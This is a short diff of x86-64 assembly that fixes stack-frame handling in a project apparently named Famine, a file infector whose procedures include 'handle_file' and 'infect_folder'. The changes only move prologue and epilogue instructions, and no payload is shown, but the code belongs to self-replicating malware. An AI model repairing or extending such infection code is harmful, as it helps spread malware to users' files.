@@ -128,13 +128,13 @@ SECTION_NAME db '.FAMINE',0
 
 handle_file proc ; int handle
 	push rbp
-	mov rbp, rsp
 	push rbx
 	push rsi
 	push r12
 	push r13
 	push r14
 	push r15
+	mov rbp, rsp
 	sub rsp, 96
 
 	mov qword ptr [rsp + 64], rdi
@@ -431,6 +431,8 @@ end_write_file_2:
 ret_failure:
 	mov rdi, qword ptr [rsp + 64]
 
+	mov rsp, rbp
+
 	pop r15
 	pop r14
 	pop r13
@@ -438,7 +440,6 @@ ret_failure:
 	pop rsi
 	pop rbx
 
-	mov rsp, rbp
 	pop rbp
 	ret
 handle_file endp
@@ -523,8 +524,8 @@ open_file endp
 
 infect_folder proc ; parametres : char *folder_name, void *buffer, size of buffer
 		push rbp
-		mov rbp, rsp
 		push rsi
+		mov rbp, rsp
 		sub	rsp, 536
 
 		mov [rsp + 32], rcx
@@ -578,8 +579,8 @@ end_find_next_file:
 		jmp loop_start
 loop_end:
 		xor rax, rax
-		pop rsi
 		mov rsp, rbp
+		pop rsi
 		pop rbp
 		ret
 infect_folder endp
@@ -686,8 +687,8 @@ ft_memcpy proc ; char *strncpy(char *dest, const char *src, size_t n);
 	jmp debut_boucle_ft_memcpy
 	fin_boucle_memcpy:
 	mov rax, r9
-	mov rsp, rbp
 
+	mov rsp, rbp
 	pop rcx
 	pop r9
 	pop rbp
